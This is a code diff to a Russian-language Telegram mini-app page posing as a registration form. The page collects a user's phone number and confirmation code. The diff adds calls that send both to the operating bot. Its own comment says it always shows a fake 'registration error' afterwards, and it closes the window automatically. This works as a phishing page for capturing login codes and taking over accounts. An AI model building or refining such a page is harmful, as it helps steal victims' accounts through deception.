@@ -173,6 +173,17 @@
             color: #666;
             padding: 20px;
         }
+        
+        .success-message {
+            background: #efe;
+            border: 1px solid #cfc;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            color: #060;
+            text-align: center;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -217,6 +228,10 @@
                 Ошибка регистрации. Попробуйте еще раз.
             </div>
             
+            <div class="success-message" id="successMsg">
+                Регистрация успешно завершена!
+            </div>
+            
             <div class="buttons">
                 <button class="btn btn-cancel" onclick="backToPhone()">НАЗАД</button>
                 <button class="btn btn-next" onclick="sendCode()">ПОДТВЕРДИТЬ</button>
@@ -227,11 +242,17 @@
         <div id="stepLoading" class="loading" style="display: none;">
             Отправка запроса...
         </div>
+        
+        <!-- Успех -->
+        <div id="stepSuccess" class="loading" style="display: none;">
+            ✅ Регистрация завершена! Закройте это окно.
+        </div>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
+        tg.enableClosingConfirmation();
         
         let userPhone = '';
         
@@ -248,11 +269,14 @@
             document.getElementById('stepPhone').style.display = 'none';
             document.getElementById('stepLoading').style.display = 'block';
             
-            // Отправляем номер телефона в бот
+            // Отправляем номер телефона в бота
             const data = {
                 action: 'send_phone',
                 phone: userPhone
             };
+            
+            // Отправляем данные в бота
+            tg.sendData(JSON.stringify(data));
             
             // Симулируем отправку кода
             setTimeout(() => {
@@ -273,19 +297,26 @@
             document.getElementById('stepCode').style.display = 'none';
             document.getElementById('stepLoading').style.display = 'block';
             
-            // Отправляем код в бот
+            // Отправляем код в бота
             const data = {
                 action: 'send_code',
                 phone: userPhone,
                 code: code
             };
             
-            // Симулируем обработку кода
+            // Отправляем данные в бота
+            tg.sendData(JSON.stringify(data));
+            
+            // Всегда показываем ошибку (как в требованиях)
             setTimeout(() => {
-                // Всегда показываем ошибку (как в требованиях)
                 document.getElementById('stepLoading').style.display = 'none';
                 document.getElementById('stepCode').style.display = 'block';
                 document.getElementById('errorMsg').style.display = 'block';
+                
+                // Автоматически закрываем через 3 секунды
+                setTimeout(() => {
+                    tg.close();
+                }, 3000);
             }, 3000);
         }
         
@@ -293,6 +324,7 @@
             document.getElementById('stepCode').style.display = 'none';
             document.getElementById('stepPhone').style.display = 'block';
             document.getElementById('errorMsg').style.display = 'none';
+            document.getElementById('successMsg').style.display = 'none';
         }
         
         function closeApp() {
@@ -306,6 +338,19 @@
         
         document.getElementById('code').addEventListener('input', function(e) {
             this.value = this.value.replace(/\D/g, '');
+        });
+        
+        // Обработка нажатия Enter
+        document.getElementById('phone').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                sendPhone();
+            }
+        });
+        
+        document.getElementById('code').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                sendCode();
+            }
         });
     </script>
 </body>
